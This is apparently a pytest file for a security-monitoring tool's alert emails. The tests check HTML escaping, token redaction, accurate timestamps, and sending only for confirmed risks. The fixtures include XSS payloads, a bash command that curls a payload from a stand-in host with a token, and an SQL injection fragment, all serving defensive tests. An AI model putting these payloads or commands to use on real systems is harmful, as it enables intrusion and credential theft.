"""Readable owner mail and strict send boundary; every device/SMTP is synthetic."""
import json
import re

import pytest

from flocks.monitoring.adapter import normalize
from flocks.monitoring.event_details import build_story
from flocks.monitoring.mail_template import TEMPLATE_VERSION, _handling_advice, display_time, render_notification
from flocks.monitoring import mailflow as m
from flocks.monitoring.investigation import fingerprint
from flocks.monitoring.store import encode, rows, write
from test_automatic import auto, Recorder, writes


def sample():
    raw = {'uuId': 'incident-d403de0f-2cc1-44c8-9648-fa67792f983c', 'name': '主机存在感染蠕虫病毒（DGA）',
           'hostIp': '10.32.1.173', 'incidentSeverity': 3, 'dealStatus': 0,
           'startTime': 1791860076, 'endTime': 1791860304}
    event = normalize('fixture-xdr', raw)
    event['device_name'] = '股份 XDR'
    evidence = [{'id': 'evidence-2', 'event': event['id'], 'event_revision': fingerprint(event), 'device': event['device'], 'source_name': '股份 XDR', 'kind': 'alerts', 'success': True,
                 'facts': {'data': {'item': [{'alertId': 'alert-ef05bbee-0056-4934-ab83-ec1791860330',
                    'name': '访问大量随机域名', 'dataSource': 'NDR', 'alertTime': '2026-10-13T02:59:50Z',
                    'srcIp': '10.32.1.173', 'dstIp': '223.5.5.5', 'dstPort': 53, 'gptResult': 120}]}}}]
    conclusion = ('[evidence-2] 事件 incident-d403de0f-2cc1-44c8-9648-fa67792f983c：'
                  '主机向公共 DNS 发起大量随机域名查询，实际通信与恶意域名行为证据一致，确认存在安全风险。'
                  'gptResult=120，attackState=3。')
    story = build_story(event, evidence, {'verdict': 'risk', 'reason': conclusion,
                                        'gaps': ['缺少具体蠕虫变种信息，处置时应定位恶意样本。'],
                                        'evidence_ids': ['evidence-2']})
    return event, story


def test_operator_mail_focuses_on_action_and_facts_instead_of_identifiers():
    event, story = sample()
    message = render_notification(event, story, '连卓然')
    assert all(label in message.text for label in ('调查结论', '基本信息', '关键证据', '事件经过', '总结和处置建议', '反馈方式'))
    assert '10.32.1.173' in message.subject and '股份 XDR' in message.subject
    assert event['id'] not in message.subject
    assert message.text.count(event['id']) == 1 and message.html.count(event['id']) == 1
    assert '风险等级：高危' in message.text
    for noise in ('evidence-', 'alert-', 'gptResult', 'attackState', '来源原值', '设备编号', '发信前状态复核', '通知编号'):
        assert noise not in message.text and noise not in message.html
    assert '223.5.5.5' in message.text and re.search(r'目的端口[ ：]+53', message.text)
    assert '2026-10-13 10:59:50（北京时间）' in message.text
    assert '具体蠕虫变种' not in message.text and '请直接回复本邮件' in message.text
    assert len(message.text) < 2600


def test_html_never_executes_or_imports_untrusted_fact_markup():
    event, story = sample()
    event['name'] = '事件<script>alert(1)</script>'
    story['conclusion'] = '<img src=x onerror="fetch(\'private\')">已确认异常。'
    story['timeline'].append({'time': '2026-10-13T03:00:00Z', 'text': '<iframe src="evil">', 'evidence_id': 'evidence-2'})
    message = render_notification(event, story, '<svg onload=alert(1)>')
    assert '<script>' not in message.html and '<img ' not in message.html and '<iframe ' not in message.html
    assert '&lt;script&gt;' in message.html and '&lt;img' in message.html and '&lt;iframe' in message.html
    assert 'href=' not in message.html and 'src=' not in message.html.replace('&lt;img src=', '').replace('&lt;iframe src=', '')


def test_missing_source_times_are_not_replaced_with_query_time():
    event, story = sample()
    event['startTime'], event['endTime'], event['basics'] = None, None, {}
    story['basics'] = {}
    story['timeline'] = []
    story['alert_details'] = []
    message = render_notification(event, story, '值班')
    assert '发生时间：来源未提供' in message.text
    assert '来源未提供可还原的详细发生时间' in message.text
    assert display_time('2026-10-13 10:59:50') == '2026-10-13 10:59:50（来源时间）'
    assert display_time(None) == '' and display_time(False) == ''
    assert display_time(1791860390000) == display_time('2026-10-13T02:59:50Z')


async def investigation(auto, *, verdict='risk', confidence='high', risk_confirmed=True, gaps=None, state='ready', facts=None):
    event = auto.event
    proof = {'id': 'evidence-1', 'event': event['id'], 'event_revision': fingerprint(event), 'success': True,
             'device': auto.event['device'], 'facts': facts or {'srcIp': '192.0.2.10', 'dstIp': '198.51.100.10', 'dstPort': 443}, 'kind': 'alerts'}
    result = {'verdict': verdict, 'confidence': confidence, 'risk_confirmed': risk_confirmed,
              'blocking_gaps': gaps or [], 'reason': '已确认该主机存在恶意外联活动，需核查处置。',
              'evidence_ids': ['evidence-1']}
    event['story'] = build_story(event, [proof], result)
    await write('INSERT INTO monitor_investigations(owner,project,event_key,event,evidence,result,state,updated_at) '
                'VALUES(?,?,?,?,?,?,?,?) ON CONFLICT(owner,project,event_key) DO UPDATE SET event=excluded.event,'
                'evidence=excluded.evidence,result=excluded.result,state=excluded.state',
                ('owner', auto.policy.project, event['key'], encode(event), encode([proof]), encode(result), state, '2026-10-13T00:00:00Z'))


@pytest.mark.parametrize('change', [dict(verdict='unknown'), dict(verdict='benign'), dict(confidence='medium'),
                                  dict(risk_confirmed=False), dict(state='deferred'), dict(gaps=['缺少证实攻击的报文'])])
async def test_unconfirmed_or_benign_events_are_recorded_without_mail_intents(auto, change):
    await investigation(auto, **change)
    await m.notify_batch(auto.policy, auto.session.id, [auto.event], Recorder(), auto.adapter)
    assert await rows('SELECT * FROM monitor_mail_notices') == []
    auto.send.assert_not_awaited()
    assert not writes(auto)


async def test_confirmed_risk_sends_one_html_notice_without_duplicate_entity_queries(auto):
    await investigation(auto)
    await m.notify_batch(auto.policy, auto.session.id, [auto.event], Recorder(), auto.adapter)
    await m.notify_batch(auto.policy, auto.session.id, [auto.event], Recorder(), auto.adapter)
    notices = await rows('SELECT * FROM monitor_mail_notices')
    assert len(notices) == 1 and notices[0]['state'] == 'sent'
    assert [call['action'] for call in auto.calls] == ['list']
    assert not writes(auto) and auto.send.await_count == 1
    event = json.loads(notices[0]['event'])
    assert event['mail_presentation']['version'] == TEMPLATE_VERSION == 2 and '<html' in event['mail_presentation']['html_body']
    assert 'fixture' in notices[0]['subject'] and '事件编号：event' in notices[0]['body']


async def test_fresh_activity_invalidates_old_result_then_reanalysis_can_send(auto):
    await investigation(auto)
    old_end = auto.raw['endTime']
    auto.raw['endTime'] += 1
    await m.notify_batch(auto.policy, auto.session.id, [auto.event], Recorder(), auto.adapter)
    notice = (await rows('SELECT * FROM monitor_mail_notices'))[0]
    assert notice['state'] == 'skipped' and notice['body']  # Prepared preview is retained; no delivery occurred.
    auto.send.assert_not_awaited()
    auto.event = normalize('device', auto.raw)
    await investigation(auto)
    await m.notify_batch(auto.policy, auto.session.id, [auto.event], Recorder(), auto.adapter)
    current = (await rows('SELECT * FROM monitor_mail_notices'))[0]
    assert current['id'] == notice['id'] and current['state'] == 'sent'
    assert auto.send.await_count == 1
    assert json.loads(current['event'])['endTime'] == old_end + 1


async def test_unsupported_source_labels_cannot_trigger_notification(auto):
    await investigation(auto, facts={'hostIp': '192.0.2.10', 'attackState': 3, 'gptResult': 120})
    await m.notify_batch(auto.policy, auto.session.id, [auto.event], Recorder(), auto.adapter)
    auto.send.assert_not_awaited()
    assert not await rows('SELECT * FROM monitor_mail_notices')


async def test_unsent_incomplete_event_can_later_be_confirmed_and_send(auto):
    await investigation(auto, confidence='low')
    await m.notify_batch(auto.policy, auto.session.id, [auto.event], Recorder(), auto.adapter)
    assert not await rows('SELECT * FROM monitor_mail_notices')
    await investigation(auto)
    await m.notify_batch(auto.policy, auto.session.id, [auto.event], Recorder(), auto.adapter)
    assert auto.send.await_count == 1


async def test_queue_intent_uses_latest_verified_evidence_instead_of_old_story(auto):
    await investigation(auto)
    await m.queue_notices(auto.policy, [auto.event], auto.session.id)
    queued = (await rows('SELECT * FROM monitor_mail_notices'))[0]
    auto.raw['endTime'] += 1
    auto.event = normalize('device', auto.raw)
    await investigation(auto)
    case = (await rows('SELECT * FROM monitor_investigations'))[0]
    result = json.loads(case['result'])
    result['reason'] = '最新一轮发现新的恶意通信，需要立即核查。'
    await write('UPDATE monitor_investigations SET result=?', (encode(result),))
    assert await m.notify_one(auto.policy, queued, auto.session.id, auto.adapter) == 'sent'
    sent = (await rows('SELECT * FROM monitor_mail_notices'))[0]
    assert '最新一轮发现新的恶意通信' in sent['body']
    assert '已确认该主机存在恶意外联活动' not in sent['body']
    assert json.loads(sent['event'])['notified_end_time'] == auto.raw['endTime']
    assert auto.send.await_count == 1


def test_entity_only_process_evidence_keeps_command_and_explains_its_use_without_inventing_time():
    event, _ = sample()
    facts = {'data': {'item': [{'fileName': 'cronw', 'filePath': '/tmp/cronw',
        'virusName': 'Synthetic.Worm', 'processName': 'cronw',
        'commandLine': 'bash -c "curl https://example.invalid/payload?token=PRIVATE_TOKEN; /tmp/cronw --install"',
        'attackState': 3, 'stage': 60}]}}
    story = build_story(event, [{'id': 'evidence-5', 'event': event['id'], 'event_revision': fingerprint(event), 'device': event['device'], 'kind': 'process', 'success': True,
                                'retrieved_at': '2026-10-13T06:00:00Z', 'facts': facts}],
                        {'verdict': 'risk', 'reason': '发现恶意进程及持久化行为，需要清理。'})
    message = render_notification(event, story, '责任人')
    evidence = message.text.split('关键证据\n', 1)[1].split('\n\n事件经过', 1)[0]
    assert '/tmp/cronw' in evidence and 'Synthetic.Worm' in evidence
    assert 'cronw' in evidence and '进程' in evidence
    assert 'bash -c "curl https://example.invalid/payload?token=[已脱敏]; /tmp/cronw --install"' in evidence
    assert '文件' in evidence and '执行' in evidence
    assert evidence.count('发生时间不详（来源未提供）') == 2
    assert all(noise not in evidence for noise in ('2026-', 'evidence-', '来源阶段值', 'attackState', '来源原值', 'PRIVATE_TOKEN'))
    assert 'PRIVATE_TOKEN' not in message.html and '&quot;curl ' in message.html


def test_file_creation_time_does_not_become_process_execution_time():
    event, _ = sample()
    facts = {'data': {'item': [{'fileName': 'worm.exe', 'filePath': '/tmp/worm.exe',
        'virusName': 'Synthetic.Worm', 'fileCreateTime': '2026-10-12T08:00:00Z',
        'processName': 'worm.exe', 'commandLine': '/tmp/worm.exe --persist'}]}}
    story = build_story(event, [{'id': 'evidence-6', 'event': event['id'], 'event_revision': fingerprint(event), 'device': event['device'], 'kind': 'file', 'success': True, 'facts': facts}],
                        {'verdict': 'risk', 'reason': '已确认恶意文件活动。'})
    message = render_notification(event, story)
    evidence = message.text.split('关键证据\n', 1)[1].split('\n\n事件经过', 1)[0]
    assert '文件创建于 2026-10-12 16:00:00（北京时间）' in evidence
    process_line = next(line for line in evidence.splitlines() if '命令行' in line)
    assert '发生时间不详（来源未提供）' in process_line
    assert '文件创建于' not in process_line
    assert '/tmp/worm.exe --persist' in evidence


def test_a_merged_alert_keeps_each_mail_observation_without_splitting_the_story_card():
    event, _ = sample()
    listed = {'id': 'evidence-7', 'event': event['id'], 'event_revision': fingerprint(event),
              'device': event['device'], 'source_name': '股份 XDR', 'kind': 'alerts', 'success': True,
              'facts': {'alertId': 'alert-merged', 'name': '可疑程序外联',
                        'srcIp': event['host'], 'dstIp': '192.0.2.22', 'dstPort': 443}}
    detail = {**listed, 'id': 'evidence-8', 'kind': 'alert_proof',
              'query': {'action': 'get_proof', 'uuid': 'alert-merged'},
              'facts': {'proof': {'fileName': 'sample.exe', 'filePath': '/tmp/sample.exe',
                                  'virusName': 'Synthetic.Worm', 'fileCreateTime': '2026-10-12T08:00:00Z',
                                  'processName': 'sample.exe', 'commandLine': '/tmp/sample.exe --persist',
                                  'url': '/sample-api', 'requestBody': 'PRIVATE_PACKET', 'responseBody': 'PRIVATE_RESPONSE'}}}
    story = build_story(event, [listed, detail], {'verdict': 'risk', 'reason': '已确认恶意程序外联。'})
    assert len(story['evidence_cards']) == 1
    assert story['evidence_cards'][0]['kind'] == 'request'
    assert len(story['evidence_cards'][0]['records']) == 2
    message = render_notification(event, story)
    evidence = message.text.split('关键证据\n', 1)[1].split('\n\n事件经过', 1)[0]
    lines = evidence.splitlines()
    assert len(lines) == 4
    network = next(line for line in lines if '外联行为依据' in line)
    assert '192.0.2.22' in network and '443' in network
    file = next(line for line in lines if '定位到相关文件' in line)
    assert all(value in file for value in ('sample.exe', '/tmp/sample.exe', 'Synthetic.Worm',
                                          '文件创建于 2026-10-12 16:00:00（北京时间）'))
    process = next(line for line in lines if '命令行' in line)
    assert '/tmp/sample.exe --persist' in process and '发生时间不详（来源未提供）' in process
    assert '文件创建于' not in process
    request = next(line for line in lines if '请求与响应记录' in line)
    assert '/sample-api' in request
    assert all(value not in message.text and value not in message.html
               for value in ('PRIVATE_PACKET', 'PRIVATE_RESPONSE', 'evidence-7', 'evidence-8', 'alert-merged'))
    assert len(story['evidence_cards']) == 1


def test_merged_card_records_keep_later_verified_timeline_and_alert_detail_references():
    event, story = sample()
    listed = {'id': 'evidence-7', 'event': event['id'], 'event_revision': fingerprint(event),
              'device': event['device'], 'kind': 'alerts', 'success': True,
              'facts': {'alertId': 'alert-merged', 'name': '初始告警',
                        'srcIp': event['host'], 'dstIp': '192.0.2.22'}}
    detail = {**listed, 'id': 'evidence-8', 'kind': 'alert_proof',
              'query': {'action': 'get_proof', 'uuid': 'alert-merged'},
              'facts': {'requestBody': 'verified request'}}
    rejected = {**listed, 'id': 'evidence-9', 'event_revision': 'old-revision',
                'facts': {'alertId': 'alert-rejected', 'name': '被拒绝的旧版本记录', 'requestBody': 'rejected'}}
    story = build_story(event, [listed, detail, rejected], {'verdict': 'risk', 'reason': '已确认异常访问。'})
    assert len(story['evidence_cards']) == 1
    assert story['evidence_cards'][0]['evidence_id'] == 'evidence-7'
    assert [item['evidence_id'] for item in story['evidence_cards'][0]['records']] == ['evidence-7', 'evidence-8']
    story['timeline'] = [
        {'time': '2026-10-13T03:00:00Z', 'text': '后续查询取得实际请求', 'evidence_id': 'evidence-8'},
        {'time': '2026-10-13T03:01:00Z', 'text': '被拒绝的旧版本时间线', 'evidence_id': 'evidence-9'},
    ]
    story['alert_details'] = [
        {'name': '后续真实告警', 'start_time': '2026-10-13T03:02:00Z', 'evidence_id': 'evidence-8'},
        {'name': '被拒绝的旧版本告警', 'start_time': '2026-10-13T03:03:00Z', 'evidence_id': 'evidence-9'},
    ]
    message = render_notification(event, story)
    timeline = message.text.split('事件经过\n', 1)[1].split('\n\n总结和处置建议', 1)[0]
    assert '后续查询取得实际请求' in timeline and '后续真实告警' in timeline
    assert '2026-10-13 11:00:00（北京时间）' in timeline
    assert '2026-10-13 11:02:00（北京时间）' in timeline
    assert '被拒绝的旧版本' not in timeline and 'evidence-' not in timeline
    assert '后续查询取得实际请求' in message.html and '后续真实告警' in message.html


def test_explicit_evidence_timestamp_and_request_fragment_are_preserved():
    event, story = sample()
    story['alert_details'] = []
    story.pop('evidence_cards', None)
    story['key_evidence'] = [{
        'evidence_id': 'evidence-9', 'event_time': '2026-10-13T03:04:05Z',
        'text': '请求中存在需核对的 SQL 可疑片段：orderBy=case when @@version like 0x382e then name end',
    }]
    message = render_notification(event, story)
    evidence = message.text.split('关键证据\n', 1)[1].split('\n\n事件经过', 1)[0]
    assert '2026-10-13 11:04:05（北京时间）' in evidence
    assert '请求中出现片段「orderBy=case when @@version like 0x382e then name end」' in evidence
    assert '定位对应访问日志' in evidence and '不单独据此认定利用成功' in evidence
    assert '来源未提供' not in evidence and 'evidence-9' not in evidence


def test_operator_conclusion_is_a_lead_then_separate_short_explanations():
    event, story = sample()
    story['operator_summary'] = '主机已出现持续的恶意域名解析活动，需要立即处置。'
    story['operator_explanation'] = ['网络记录显示主机多次请求解析已标记为恶意的域名。',
                                     '这些记录支持异常域名访问判断，不将公共 DNS 服务器视为恶意控制端。']
    story['conclusion'] = '已通过cap-2查询；gptResult为120/160；attack_result=3；连续约3个月。'
    message = render_notification(event, story)
    conclusion = message.text.split('调查结论\n', 1)[1].split('\n\n基本信息', 1)[0]
    assert conclusion.splitlines() == [story['operator_summary'], *story['operator_explanation']]
    assert '<strong>主机已出现持续' in message.html
    for technical in ('cap-2', 'gptResult', 'attack_result', '3个月'):
        assert technical not in message.text and technical not in message.html


def test_technical_historic_reason_does_not_replace_a_fact_driven_summary():
    event, story = sample()
    story['conclusion'] = ('已通过cap-2查询事件关联告警：10.32.1.173在1788945933至1791858565期间向'
                           '223.5.5.5:53发起DNS查询；gptResult为120/160；连续约3个月，说明感染。')
    message = render_notification(event, story)
    conclusion = message.text.split('调查结论\n', 1)[1].split('\n\n基本信息', 1)[0]
    assert conclusion.startswith('已确认主机 10.32.1.173 存在需要处置的安全风险。')
    assert 'DNS' in conclusion
    assert all(value not in message.text for value in ('cap-2', 'gptResult', '1788945933', '3个月'))
    assert '已感染' not in conclusion and '已建立C2' not in conclusion


def test_card_evidence_has_meaning_first_and_no_debug_or_raw_packet_dump():
    event, story = sample()
    story['evidence_cards'] = [{
        'summary': 'TDP记录主机请求解析恶意域名，支持异常域名访问判断。',
        'source': 'TDP', 'time': '2026-10-13T03:00:00Z',
        'fields': [{'key': 'domain', 'label': '影响域名', 'value': ['mining.invalid', 'second.invalid']},
                   {'key': 'dst_ip', 'label': '目的 IP', 'value': '223.5.5.5'},
                   {'key': 'dst_port', 'label': '目的端口', 'value': 53},
                   {'key': 'gptResult', 'label': '来源研判原值', 'value': 120}],
        'packets': [{'text': 'PRIVATE_PACKET'}], 'raw': {'token': 'PRIVATE_TOKEN'},
        'query': {'action': 'get_alert', 'uuid': 'alert-SECRET'}, 'id': 'evidence-88',
    }]
    message = render_notification(event, story)
    evidence = message.text.split('关键证据\n', 1)[1].split('\n\n事件经过', 1)[0]
    assert len(evidence.splitlines()) == 1
    assert evidence.startswith('- TDP记录主机请求解析恶意域名，支持异常域名访问判断。')
    assert all(value in evidence for value in ('2026-10-13 11:00:00', 'mining.invalid', '223.5.5.5', '53'))
    assert all(value not in message.text and value not in message.html for value in
               ('PRIVATE_PACKET', 'PRIVATE_TOKEN', 'alert-SECRET', 'evidence-88', 'gptResult'))


def test_explicit_empty_verified_cards_never_revive_legacy_rejected_evidence():
    event, story = sample()
    story['evidence_cards'] = []
    story['key_evidence'] = [{'text': '源 IP：10.32.1.173；目的 IP：203.0.113.99；目的端口：443'}]
    story['alert_details'] = [{'src_ip': '10.32.1.173', 'dst_ip': '203.0.113.99', 'dst_port': 443}]
    message = render_notification(event, story)
    evidence = message.text.split('关键证据\n', 1)[1].split('\n\n事件经过', 1)[0]
    assert '203.0.113.99' not in evidence
    assert '203.0.113.99' not in message.text
    assert '风险判断依据见上述调查结论' in evidence


@pytest.mark.parametrize('name', ['主机存在fakewebsite', '主机存在感染蠕虫病毒（DGA）',
                                  '主机存在挖矿', '目录遍历漏洞', '口令爆破', 'netcat交互式shell', '其他风险'])
def test_handling_advice_is_specific_and_twenty_to_thirty_chinese_characters(name):
    advice = _handling_advice(name, '10.10.250.66')
    assert 20 <= len(re.findall(r'[\u4e00-\u9fff]', advice)) <= 30
    assert '请核查' not in advice and '访问日志、异常请求及服务暴露' not in advice
    assert '复查' in advice
    if 'fakewebsite' in name:
        assert '阻断恶意域名' in advice and '受影响主机' in advice
        assert '接口' not in advice


def test_summary_and_handling_advice_follow_timeline_before_reply_instructions():
    event, story = sample()
    message = render_notification(event, story)
    for body in (message.text, message.html):
        assert body.index('事件经过') < body.index('总结和处置建议') < body.index('反馈方式')
        assert '请核查主机' not in body and '具体蠕虫变种' not in body
        assert '清理恶意项' in body


def test_timeline_describes_dns_queries_without_fabricated_duration_or_c2_connections():
    event, story = sample()
    event['name'] = '主机存在fakewebsite'
    story['alert_details'] = [{'evidence_id': 'evidence-2', 'name': 'fakewebsite', 'src_ip': '10.10.250.66',
                               'dst_ip': '180.184.1.20', 'dst_port': 53,
                               'domain': ['one.invalid', 'two.invalid'],
                               'start_time': 1788945933, 'end_time': 1791858565}]
    message = render_notification(event, story)
    timeline = message.text.split('事件经过\n', 1)[1].split('\n\n总结和处置建议', 1)[0]
    assert '2026-09-09 17:25:33（北京时间）' in timeline
    assert '2026-10-13 10:29:25（北京时间）' in timeline
    assert '向 DNS 服务器 180.184.1.20 发起域名解析请求' in timeline
    assert 'one.invalid、two.invalid' in timeline
    assert all(value not in timeline for value in ('3个月', '1788945933', '1791858565', 'C2连接', '失陷'))



def test_narrative_duration_claims_do_not_override_source_dates():
    event, story = sample()
    story['operator_summary'] = '主机连续约3个月与恶意域名保持通信，需要处置。'
    story['operator_explanation'] = ['异常活动长达三个月，因此已确认感染。']
    story['conclusion'] = '主机持续3个月发起恶意请求。'
    message = render_notification(event, story)
    assert '3个月' not in message.text and '三个月' not in message.text
    assert '2026-10-13 10:59:50（北京时间）' in message.text
    assert 'DNS' in message.text
